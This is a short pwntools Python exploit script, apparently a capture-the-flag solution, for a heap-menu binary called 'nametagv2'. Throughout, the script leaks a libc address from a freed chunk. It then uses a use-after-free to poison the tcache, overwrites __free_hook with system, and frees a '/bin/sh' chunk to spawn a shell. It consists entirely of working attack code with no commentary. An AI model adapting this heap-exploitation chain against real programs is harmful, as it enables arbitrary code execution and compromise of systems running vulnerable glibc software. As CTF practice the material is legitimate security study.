#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './nametagv2')
libc = ELF(exe.libc.path)

def make(idx, size):
   io.sendlineafter(b'> ', b'1')
   io.sendlineafter(b': ', str(idx).encode())
   io.sendlineafter(b': ', str(size).encode())

def edit(idx, data):
   io.sendlineafter(b'> ', b'2')
   io.sendlineafter(b': ', str(idx).encode())
   io.sendlineafter(b': ', data)

def free(idx):
   io.sendlineafter(b'> ', b'3')
   io.sendlineafter(b': ', str(idx).encode())

def show(idx):
   io.sendlineafter(b'> ', b'4')
   io.sendlineafter(b': ', str(idx).encode())

io = process()

make(0, 0x500)
make(1, 0xe0)
free(0)
show(0)
libc.address = u64(io.recvline().split(b': ')[1][:-1].ljust(8, b'\x00')) - 0x3ebca0

make(2, 0xe0)
make(3, 0xe0)
free(3)
free(2)

edit(2, p64(libc.sym.__free_hook))

make(4, 0xe0)
make(5, 0xe0)
edit(5, p64(libc.sym.system))
edit(4, b'/bin/sh\x00')
free(4)

io.interactive()

